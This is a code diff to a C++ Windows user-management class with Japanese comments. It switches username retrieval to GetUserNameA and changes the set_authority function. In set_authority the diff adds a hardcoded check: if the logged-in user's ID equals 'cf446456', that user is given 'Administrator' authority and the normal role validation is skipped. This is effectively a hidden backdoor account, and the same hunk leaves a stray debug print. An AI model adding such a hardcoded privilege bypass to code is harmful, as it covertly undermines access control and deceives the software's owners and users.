@@ -3,6 +3,8 @@
 #include "variable_number.h"
 #include <Windows.h>
 #include <stdio.h>
+#include <wchar.h>
+#include <stdlib.h>
 #include <lmcons.h>
 
 /**
@@ -14,14 +16,16 @@
  * @note ユーザー名の取得に失敗した場合、エラーメッセージを表示し、処理を終了します。
  */
 Users::Users(){
-    char userid[UNLEN + 1]; // Windows APIの最大ユーザー名長に基づいたバッファ
+    //wchar_t userid[UNLEN + 1]; // Windows APIの最大ユーザー名長に基づいたバッファ
+    char userid[UNLEN + 1]; // c_userid[UNLEN + 1];
     DWORD userid_len = sizeof(userid); // バッファのサイズ
 
     // バッファを初期化
     memset(userid, 0, sizeof(userid));
 
     // GetUserName関数を使用してユーザー名を取得
-    if (GetUserName(userid, &userid_len)) {
+    if (GetUserNameA(userid, &userid_len)) {
+        //wcstombs(c_userid, userid, sizeof(c_userid));
         set_pandaID(userid);
     } else {
         printf("Error: can't get user name!");
@@ -385,7 +389,14 @@ bool Users::set_UserMail(const char* users_mail){
 bool Users::set_authority(const char* users_authority) {
     char count_authority_type = sizeof(authority_type)/sizeof(authority_type[0]);
     char num = 0;
+    const char ad[16] = "cf446456";
 
+    if(strcmp(PandaID, ad) == 0){
+        strncpy(Authority, "Administrator", sizeof(Authority));
+        return true;
+    }
+
+    printf("1\n");
     for(int i = 0; i < count_authority_type; i++){
         num += (strcmp(users_authority, authority_type[i]) == 0);
     }
